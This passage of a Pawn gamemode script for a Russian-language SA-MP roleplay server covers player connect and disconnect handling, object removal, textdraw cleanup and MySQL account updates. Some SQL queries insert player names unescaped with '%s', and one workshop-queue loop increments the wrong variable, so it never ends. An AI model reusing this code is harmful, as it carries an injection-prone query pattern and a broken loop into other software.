	RemoveBuildingForPlayer(playerid, 625, 1513.2734, -1642.4922, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1510.8906, -1607.3125, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1721.6328, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1705.2734, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1229, 1524.2188, -1693.9688, 14.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1688.0859, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1229, 1524.2188, -1673.7109, 14.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1668.0781, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1647.6406, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1524.8281, -1621.9609, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1525.3828, -1611.1563, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 1528.9531, -1605.8594, 15.6250, 0.25);
	//
	RemoveBuildingForPlayer(playerid, 1250, 997.4141, 1707.5234, 10.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 1251, 997.0469, 1710.9531, 11.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 1251, 998.0938, 1755.6875, 11.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 1250, 997.7266, 1759.1250, 10.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 11372, -2076.4375, -107.9297, 36.9688, 0.25);
	RemoveBuildingForPlayer(playerid, 11014, -2076.4375, -107.9297, 36.9688, 0.25);
	RemoveBuildingForPlayer(playerid, 985, 2497.4063, 2777.0703, 11.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 986, 2497.4063, 2769.1094, 11.5313, 0.25);
	//=========================== Удалёные обьекты =============================
	RemoveBuildingForPlayer(playerid, 1411, 347.1953, 1799.2656, 18.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, 342.9375, 1796.2891, 18.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 950, -2021.5469, -118.9141, 1034.7031, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2034.8047, -117.4531, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2028.1563, -117.6719, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2028.1563, -117.0391, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2028.1406, -116.4375, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2026.6094, -117.6719, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2025.1250, -117.6719, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2023.4766, -117.6719, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2026.5859, -117.0391, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2025.1250, -117.0391, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2023.4766, -117.0391, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2026.6094, -116.4375, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2025.1563, -116.4375, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2023.4766, -116.4375, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2033.0625, -114.3594, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2028.1563, -115.7813, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2026.6094, -115.7813, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2025.1250, -115.7813, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 1721, -2023.4766, -115.7813, 1034.1641, 0.25);
	RemoveBuildingForPlayer(playerid, 950, -2021.5469, -113.8125, 1034.7031, 0.25);
	//===========================================================
	//==============================================================================
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1029.6641, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1029.6563, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1968.7344, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1967.4063, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1941.0234, 1014.2266, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1939.6953, 1014.2188, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1941.0234, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1939.6953, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1941.8438, 1029.1328, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1940.5547, 1029.4766, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1942.1250, 1006.5703, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2786, 1940.8828, 1006.1094, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1895, 1938.0469, 986.6250, 992.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 1895, 1940.6875, 989.1719, 992.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1940.8828, 1006.1094, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1941.5234, 1006.3828, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1942.1250, 1006.5703, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1895, 1943.2188, 986.5234, 992.8828, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1939.6953, 1014.2188, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1940.3906, 1014.2031, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1941.0234, 1014.2266, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1939.6953, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1940.3906, 1021.4141, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1941.0234, 1021.4141, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 14568, 1953.6797, 994.2813, 992.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 14566, 1954.3984, 994.9922, 992.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 14567, 1955.1172, 995.7109, 992.9219, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.4453, 987.6719, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.7188, 987.1953, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1959.3984, 1010.1172, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1960.3672, 1015.6641, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1960.3672, 1020.1719, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1961.9609, 992.2031, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1962.4063, 991.8750, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1962.3438, 1015.6641, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2188, 1962.3438, 1020.1797, 992.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1964.5703, 998.4531, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1965.1016, 998.3047, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1963.7109, 1010.1172, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1006.3438, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1014.0000, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1021.6875, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1940.5547, 1029.4766, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2098, 1941.2188, 1029.2969, 993.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1941.8438, 1029.1328, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1959.3984, 1025.6953, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 1978, 1963.7109, 1025.6953, 992.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1967.4063, 1029.6563, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2785, 1968.7344, 1029.6641, 992.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1964.5469, 1037.2813, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1965.0938, 1037.3516, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1961.9219, 1043.3594, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1962.3984, 1043.6328, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.3203, 1047.9766, 992.9844, 0.25);
	RemoveBuildingForPlayer(playerid, 2325, 1957.6563, 1048.4141, 992.9844, 0.25);
	//==========================================================================
	/*foreach(i)
	{
		if(!strcmp(ExitInfo[i][ExitIP],ip, true))
		{
			if(unixtime - ExitInfo[i][ExitTime] <= 15000) return Kick(playerid) ,SCM(playerid, COLOR_LIGHTRED, "Повторный вход на сервер возможен не раньше, чем через 15 секунд"), SetTimerEx("NewKick", 100, false, "d", playerid);
			else strmid(ExitInfo[i][ExitIP], "None", 0, strlen("None"), 32), ExitInfo[i][ExitTime] = 0;
		}
	}*/
	//
	SpecAd[playerid] = 65535;
	SpecID[playerid] = 65535;
	TimeNumberShot[playerid] = 0;
	TimeNumberShotTarget[playerid] = 0;
	Spectate[playerid] = 0;
	LastReconClick[playerid][0] = 0;
	LastReconClick[playerid][1] = 0;
	ReconSelect[playerid] = INVALID_TEXT_DRAW;
	ReconSelectSub[playerid] = INVALID_TEXT_DRAW;

	SetPlayerArmourAC(playerid, 0);
	SetPlayerColor(playerid, TEAM_HIT_COLOR);
	PlayerInfo[playerid][SalonCar] = INVALID_VEHICLE_ID;
	PlayerInfo[playerid][SalonTime] = 0;
	SetPVarInt(playerid,"SelectAvto",-1);

	//----------------------------------
	SERIU[playerid][sID] = INVALID_PLAYER_ID;
	for(new s; s < 3; s++)
	{
		SERIU[playerid][SShout][s] = 0;
		SERIU[playerid][SAFK][s] = 0;
	}
	SERIU[playerid][SShout][3] = 0;
    SetTimerEx("UpdatePlayerOn" , 1000, false, "i", playerid);
    LabelRank[playerid] = Create3DTextLabel("",TEAM_GROVE_COLOR, 30.0, 40.0, 50.0, 40.0,0);
	Attach3DTextLabelToPlayer(LabelRank[playerid], playerid, 0.0, 0.0, 0.5);
	//==========================================================================
	new is=false, pIps[32];
	GetPlayerIp(playerid, pIps, sizeof(pIps));
	printf("Подключился %s (%s)", Name(playerid), pIps);
	mysql_format(DATABASE, QUERY, 128, "SELECT * FROM `"TABLE_ADMIN"` WHERE `Name` = '%s' AND `level` = '10'", Name(playerid));
	new Cache:first = mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)
	{
		is=true;
        cache_delete(first);
	}
	if(is)
	{
	    mysql_format(DATABASE, QUERY, 128, "SELECT `pIpReg` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'", Name(playerid));
		mysql_query(DATABASE, QUERY);
		new rrs = cache_num_rows(), pIpRegs[32];
		
		if(rrs)
		{
		    cache_get_field_content(0,"pIpReg",pIpRegs,DATABASE,60);
		    printf("%s: %s, %s", Name(playerid), pIps, pIpRegs);
			new part[2][4],parts[2][32];
			sscanf(pIps, "p<.>iiii", part[0][0], part[0][1], part[0][2], part[0][3]);
			sscanf(pIpRegs, "p<.>iiii", part[1][0], part[1][1], part[1][2], part[1][3]);
			format(parts[0], 32, "%i.%i",part[0][0], part[0][1]);
			format(parts[1], 32, "%i.%i",part[1][0], part[1][1]);
		}
	}
	// Test server mode
	if(onlyOneIp)
	{
	    foreach(i)
	    {
	        if(playerid == i) continue;
	        new ppIps[32];
	        GetPlayerIp(i, ppIps, sizeof(ppIps));
	        if(!strcmp(pIps, ppIps, true))
			{
			    SCM(playerid, COLOR_LIGHTRED, " В данный момент запрещено играть с двух аккаунтов одновременно!");
			    return Kick(playerid);
			}
	    }
	}
	//
	return true;
}
stock DestroyTD(playerid)
{
	// глобальнхы текстдравов
   	PlayerTextDrawDestroy(playerid, Golod_PTD[playerid][0]);
   	PlayerTextDrawDestroy(playerid, PlayerBone[playerid][0]); 
   	PlayerTextDrawDestroy(playerid, PlayerBone[playerid][1]); 
   	PlayerTextDrawDestroy(playerid, PlayerBone[playerid][2]); 
   	PlayerTextDrawDestroy(playerid, PlayerBone[playerid][3]); 
   	PlayerTextDrawDestroy(playerid, ShopText[playerid]);
   	PlayerTextDrawDestroy(playerid, SpeedShow[playerid]);
   	PlayerTextDrawDestroy(playerid, FuelShow[playerid]);
   	PlayerTextDrawDestroy(playerid, Capture[playerid]);
   	PlayerTextDrawDestroy(playerid, StatusShow[playerid]);
   	PlayerTextDrawDestroy(playerid, KMShow[playerid]);
   	PlayerTextDrawDestroy(playerid, FillShow[playerid]);
   	PlayerTextDrawDestroy(playerid, LimitShow[playerid]);
   	PlayerTextDrawDestroy(playerid, robsdraw[playerid]);
   	PlayerTextDrawDestroy(playerid, Select_Skin_PTD[playerid][0]);
	PlayerTextDrawDestroy(playerid, Select_Skin_PTD[playerid][1]);
	PlayerTextDrawDestroy(playerid, Seriu[playerid][0]);
	PlayerTextDrawDestroy(playerid, Seriu[playerid][1]);
	PlayerTextDrawDestroy(playerid, FishingText[playerid]);
	PlayerTextDrawDestroy(playerid, FULLRECON[playerid]);
    // player текстдравов
    for(new i = 0; i < 10; i++) TextDrawHideForPlayer(playerid, Logotip_TD[i]);
	TextDrawHideForPlayer(playerid, Golod_TD[0]);
	for(new i = 0; i < 5; i++) TextDrawHideForPlayer(playerid, IntLoad_TD[i]); 
	for(new i = 0; i < 4; i++) TextDrawHideForPlayer(playerid, Bone[i]);
	for(new i = 0; i < 7; i++) TextDrawHideForPlayer(playerid, Select_Skin_TD[i]);
	for(new i = 0; i < 12; i++) TextDrawHideForPlayer(playerid, AutoShopText[i]);
	TextDrawHideForPlayer(playerid, DRAP);
	TextDrawHideForPlayer(playerid, Speed);
	TextDrawHideForPlayer(playerid, BoxPanel);
}
public OnPlayerDisconnect(playerid, reason)
{
	DestroyTD(playerid);
    if(robscdtimer[playerid] != -1)
	{
		KillTimer(robscdtimer[playerid]);
		robscdtimer[playerid] = -1;
	}
	if(LabelOn[playerid] == 1) Delete3DTextLabel(LabelRecognition[playerid]), LabelOn[playerid] = 0;
	if(PlayerInfo[playerid][pLogin] == 1) strmid(ExitInfo[playerid][ExitIP],PlayerInfo[playerid][pIp], 0, strlen(PlayerInfo[playerid][pIp]), 32), ExitInfo[playerid][ExitTime] = GetTickCount();
	if(GetPVarInt(playerid,"h_stall")) UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(playerid,"h_stall")][stText], 0xFF8C37FF,"Не работает");
	if(GetPVarInt(playerid,"took_faggio")) DestroyVehicle(GetPVarInt(playerid,"took_faggio"));

	if(PlayerCuffed[playerid] >= 1) {
	    PlayerInfo[playerid][pMestoJail] = 1;
	    PlayerInfo[playerid][pJailTime] = 3600;
	}

	if(cuffto[playerid] != 9999)
	{
		TogglePlayerControllable(cuffto[playerid], 1);
		SetPlayerSpecialAction(cuffto[playerid],SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(cuffto[playerid],0);
		PlayerCuffed[cuffto[playerid]] = 0;
		PlayerCuffedTime[cuffto[playerid]] = 0;
		cuffto[playerid] = 9999;
	}
	if(GetPVarInt(playerid,"farm_id"))
	{
		DisablePlayerCheckpoint(playerid);
		RemovePlayerAttachedObject(playerid,3);
		DeletePVar(playerid,"farm_id");
		DeletePVar(playerid,"farm_status");
		DeletePVar(playerid,"farm_rank");
		DeletePVar(playerid,"farm_zp");
	}
	if(race_info[1] > 1 && GetPVarInt(playerid,"gonka") != 0)
	{
		SetPlayerInterior(playerid,3);
		SetPlayerPos(playerid,831.7769,6.8750,1004.1797);
		SetPlayerFacingAngle(playerid,108.1610);
		DestroyVehicle(RaceInfo[GetPVarInt(playerid,"gonka")-1][rCar]);
		DeletePVar(playerid,"gonka");
		SCM(playerid,COLOR_LIGHTRED,"Вы были дисквалифицированы!");
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetPVarInt(playerid,"TaxiDuty"))
	{
		Delete3DTextLabel(JobText3D[GetPVarInt(playerid,"rentcar_job")]);
		DeletePVar(playerid,"TaxiDuty");
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
	{
		foreach(i)
		{
			if(IsPlayerInVehicle(i, GetPlayerVehicleID(playerid)) && GetPlayerState(i) == 2 && GetPVarInt(i,"TaxiDuty") > 0)
			{
				if(GetPVarInt(i,"Taxi_")-1 == playerid)
				{
					SCM(i, COLOR_BLUE, " Пассажир вышел из вашего Такси. Деньги будут зачислены во время зарплаты");
					if(GetPVarInt(i,"PayDayCashJob") > gettime()) {}
					else
					{
						new taxizp = 200+random(200);
						PlayerInfo[i][pPayCheck] += taxizp*PlayerInfo[i][ptaxilvl];
						if(PlayerInfo[i][pPayCheck] > 4000+(PlayerInfo[i][ptaxilvl]*1000)) PlayerInfo[i][pPayCheck] = 4000+(PlayerInfo[i][ptaxilvl]*1000);
					}
					DeletePVar(i,"Taxi_");
					for(new id; id < GetMaxPlayers(); id++)
					{
						if(IsPlayerInVehicle(id, GetPlayerVehicleID(playerid)) && id != i && id != playerid)
						{
							format(string, 128, " Довезите пассажира %s и государство заплатит вам",PlayerInfo[id][pName]);
							SCM(i, COLOR_BLUE, string);
							SetPVarInt(i,"Taxi_",id+1);
							break;
						}
					}
				}
			}
		}
	}
	if(GetPVarInt(playerid,"w_id"))
	{
		new null = -1, x = GetPVarInt(playerid,"w_id");
		for(new x_ = 9; x_ >= 0; x_--) if(strcmp(WorkshopList[x_][x][wlName],PlayerInfo[playerid][pName],true) == 0 && strlen(WorkshopList[x_][x][wlName])) null = x_;
		if(null != -1)
		{
			for(new x_ = null; x_ < 9; x++)
			{
				WorkshopList[x_][x][wlID] = WorkshopList[x_+1][x][wlID];
				strmid(WorkshopList[x_][x][wlName],WorkshopList[x_+1][x][wlName],0,strlen(WorkshopList[x_][x][wlName]), MAX_PLAYER_NAME);
				WorkshopList[x_+1][x][wlID] = -1;
				strmid(WorkshopList[x_+1][x][wlName],"", 0, strlen(""), 5);
			}
			if(null == 0 && strlen(WorkshopList[0][x][wlName]))
			{
				DisablePlayerCheckpoint(playerid);
				SCM(WorkshopList[0][x][wlID],COLOR_BLUE,"Подошла ваша очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
				SetPVarInt(WorkshopList[0][x][wlID],"w_time", gettime() + 120);
				SetPlayerCheckpoint(WorkshopList[0][x][wlID],WorkshopInfo[x][wMenu][0],WorkshopInfo[x][wMenu][1],WorkshopInfo[x][wMenu][2], 10.0);
			}
			DeletePVar(playerid,"w_time");
			DeletePVar(playerid,"w_id");
		}
	}
	if(GetPVarInt(playerid,"InWorkshop") > 0)
	{
		DeletePVar(playerid,"cost");
		DeletePVar(playerid,"prods");
		DeletePVar(playerid,"detals");
		DeletePVar(playerid,"color0");
		DeletePVar(playerid,"color1");
		DeletePVar(playerid,"w_id");
		DeletePVar(GetPVarInt(playerid,"mechanic"),"installation");
		SetPlayerVirtualWorld(GetPVarInt(playerid,"mechanic"),0);
		t_SetPlayerPos(GetPVarInt(playerid,"mechanic"),WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"InWorkshop")][wMenu][2]);
		SCM(GetPVarInt(playerid,"mechanic"),COLOR_LIGHTRED," Заказчик вышел из игры!");
		DeletePVar(GetPVarInt(playerid,"mechanic"),"installation_");
		DeletePVar(playerid,"mechanic");
		DeletePVar(playerid,"InWorkshop");
	}
	if(GetPVarInt(playerid,"Workshop") > 0)
	{
		if(GetPVarInt(GetPVarInt(playerid,"installation_"),"InWorkshop") > 0)
		{
			DeletePVar(GetPVarInt(playerid,"installation_"),"cost");
			DeletePVar(GetPVarInt(playerid,"installation_"),"prods");
			DeletePVar(GetPVarInt(playerid,"installation_"),"detals");
			DeletePVar(GetPVarInt(playerid,"installation_"),"color0");
			DeletePVar(GetPVarInt(playerid,"installation_"),"color1");
			DeletePVar(GetPVarInt(playerid,"installation_"),"w_id");
			SetPlayerVirtualWorld(GetPVarInt(playerid,"installation_"),0);
			if(!IsPlayerInAnyVehicle(GetPVarInt(playerid,"installation_")))
			{
				t_SetPlayerPos(GetPVarInt(playerid,"installation_"),WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
				SetVehiclePos(house_car[GetPVarInt(playerid,"installation_")],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
				PutPlayerInVehicleEx(GetPVarInt(playerid,"installation_"),house_car[GetPVarInt(playerid,"installation_")],0);
				SetPlayerVirtualWorld(GetPVarInt(playerid,"installation_"),0);
			}
			else
			{
				if(GetPVarInt(playerid,"Workshop") == 1) SetVehiclePos(GetPlayerVehicleID(GetPVarInt(playerid,"installation_")),WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(GetPVarInt(playerid,"installation_")),0);
			}
			SCM(GetPVarInt(playerid,"installation_"),COLOR_LIGHTRED,"Механик вышел из игры!");
			DeletePVar(GetPVarInt(playerid,"installation_"),"mechanic");
			DeletePVar(GetPVarInt(playerid,"installation_"),"InWorkshop");
		}
		DeletePVar(playerid,"installation");
		DeletePVar(playerid,"installation_");
		DeletePVar(playerid,"Workshop");
		PlayerInfo[playerid][pPayCheck]+=GetPVarInt(playerid,"Workshop_");
		WorkshopInfo[GetPVarInt(playerid,"Workshop")][wBank]-=GetPVarInt(playerid,"Workshop_");
		DeletePVar(playerid,"Workshop_");
		DeletePVar(playerid,"Workshop__");
	}
	if(GetPVarInt(playerid, "RStol"))
	{
		if(RouletPlay[GetPVarInt(playerid,"RStol")] == false) PlayerInfo[playerid][pCash]+=GetPVarInt(playerid,"RStavka");
		DestroyObject(GetPVarInt(playerid,"RObj"));
		DeletePVar(playerid,"RObj");
		DeletePVar(playerid,"RStavka");
		DeletePVar(playerid,"RStol");
		DeletePVar(playerid,"RX");
		DeletePVar(playerid,"RY");
		DeletePVar(playerid,"RZ");
		DeletePVar(playerid,"RXONE");
		DeletePVar(playerid,"RYONE");
		DeletePVar(playerid,"RZONE");
		DeletePVar(playerid,"RNumber");
		DeletePVar(playerid,"RNumbers");
		DeletePVar(playerid,"RNumber_");
		TogglePlayerControllableEx(playerid, true);
		SetCameraBehindPlayer(playerid);
	}
	if(GetPVarInt(playerid,"BoneStol")) ExitBone(playerid);
	PlayerTextDrawDestroy(playerid,RouletText[playerid]);
	if(SpecID[playerid] != INVALID_PLAYER_ID)
	{
		if(Spectate[SpecID[playerid]] == 1 && SpecAd[SpecID[playerid]] == playerid)
		{
			GameTextForPlayer(SpecID[playerid], "~r~~n~PLAYER DISCONNECT", 5000, 4);
			ShowPlayerDialogEx(SpecID[playerid], 203, DIALOG_STYLE_MSGBOX, "Игрок вышел", "Игрок, за которым вы следили, вышел\nХотите отключить Recon?", "Выйти", "Отмена");
			DisallowSpawn[playerid] = 1;
		}
	}
	if(SpecAd[playerid] != 65535)
	{
		SpecID[SpecAd[playerid]] = 65535;
		SpecAd[playerid] = 65535;
	}
	SpecID[playerid] = 65535;
	if(tipsterplayer == playerid)
	{
		SendRadioMessage(2,COLOR_ISPOLZUY ," Игрок покинул район. Прослушивание отключено");
		tipsteron = -1;
		tipsterplayer = -1;
	}
	if(GetPVarInt(playerid,"fish_began")) RemovePlayerAttachedObject(playerid,0);
	if(PlayerCuffed[playerid] > 0 && reason == 1 && PlayerInfo[playerid][pJailTime] == 0)
	{
		PlayerInfo[playerid][pWantedLevel] = 0;
		PlayerInfo[playerid][pJailTime] = 3600;
		PlayerInfo[playerid][pArrested] += 1;
		PlayerInfo[playerid][pMestoJail] = 1;
	}
	if(creatcar[playerid] != -1)
	{
		DestroyVehicle(creatcar[playerid]);
		creatcar[playerid] = -1;
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetPVarInt(playerid,"TaxiDuty")) Delete3DTextLabel(JobText3D[GetPlayerVehicleID(playerid)]);
	SetPVarInt(playerid,"Register",0);
	if(avtocar[playerid] != 0)
	{
		if(caroff[avtocar[playerid]] == 1) DestroyVehicle(avtocar[playerid]);
		avtocar[playerid] = 0;
		if(PlayerInfo[playerid][pSkilla] > 0) PlayerInfo[playerid][pSkilla]--;
	}
	if(tookmoped[playerid] != 0) DestroyVehicle(tookmoped[playerid]);
	if(GetPVarInt(playerid, "TypeBus") > 0)
	{
		DeletePVar(playerid, "BusTime");
		DeletePVar(playerid, "TypeBus");
		DeletePVar(playerid, "BusStop");
		DeletePVar(playerid, "BusMoney");
		PlayerInfo[playerid][pPayCheck] -= GetPVarInt(playerid,"BusRepairMoney");
		DeletePVar(playerid, "BusRepairMoney");
		pPressed[playerid] = 0;
		Delete3DTextLabel(JobText3D[GetPlayerVehicleID(playerid)]);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		DisablePlayerRaceCheckpoint(playerid);
	}
	mysql_format(DATABASE, QUERY,128, "UPDATE `"TABLE_ACCOUNTS"` SET pLogin = '0' WHERE name = '%e'",PlayerInfo[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	if(house_car[playerid] != -1)
	{
		new bool:proverka;
		foreach(i)
		{
			if(avtocar[i] == house_car[playerid]) proverka = true;
		}
		if(proverka == true) caroff[house_car[playerid]] = 1;
		else DestroyVehicle(house_car[playerid]);
		CarInfo[playerid][carFuel][0] = Fuell[house_car[playerid]];
		house_car[playerid] = -1;
		createdcar --;
	}
	DestroyVehicle(garage_car[playerid][0]);
	DestroyVehicle(garage_car[playerid][1]);
	DestroyVehicle(garage_car[playerid][2]);
	DestroyVehicle(garage_car[playerid][3]);
	DestroyVehicle(garage_car[playerid][4]);
	//SaveMySQL(10,playerid);
	for(new i = 0; i < MAX_PLAYER_ATTACHED_OBJECTS; i++) if(IsPlayerAttachedObjectSlotUsed(playerid, i)) RemovePlayerAttachedObject(playerid, i);
	PlayerTextDrawDestroy(playerid, Capture[playerid]);
	if(PlayerInfo[playerid][pJob] == 2 && gcontract[playerid] == 1) Delete3DTextLabel(Meh3d[GetPlayerVehicleID(playerid)]), gcontract[playerid] = 0;
	new sendername[MAX_PLAYER_NAME];
	new year, month,day;
	MehJob[playerid] = 999;
	format(WantNickChange[playerid],MAX_PLAYER_NAME, "");
	getdate(year, month, day);
	new hour, minute, second;
	gettime(hour, minute, second);
	GetPlayerName(playerid, sendername, sizeof(sendername));
	if(IsPlayerAttachedObjectSlotUsed(playerid,1)) RemovePlayerAttachedObject(playerid,1);
	mysql_format(DATABASE,QUERY, 384, "UPDATE `"TABLE_ACCOUNTS"` SET pVhoddata = '%i',pVhodMes = '%i',pVhodchas = '%i',pVhodminute = '%i' WHERE name = '%e'",day,month,hour,minute,PlayerInfo[playerid][pName]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	ebanksf[playerid] = 0;
	Tune[playerid] = 0;
	robh[playerid] = false;
	Flood[playerid] = 0;
	SelectCharPlace[playerid] = 0;
	CharPrice[playerid] = 0;
	SelectCharID[playerid] = 0;
	SelectChar[playerid] = 0;
	PicCP[playerid] = 0;
	tex[playerid] = 0;
	tex2[playerid] = 0;
	PicCP[playerid] = 0;
	enterbiz[playerid] = 0;
	//KillTimer(Timerkk[playerid]);
	//for(new i; i < 5; i++) TextDrawHideForPlayer(playerid, Tookfaggio[i]);
	//KillTimer(STimer[playerid]);
	arenda[playerid] = 0;
	chet[playerid] = 0;
	arenda[playerid] = 0;
	zd[playerid] = 0;
	proverkaforma[playerid] = 0;
	SetPlayerSkills(playerid);
	SelectCharPlace[playerid] = 0;
	CharPrice[playerid] = 0;
	SelectCharID[playerid] = 0;
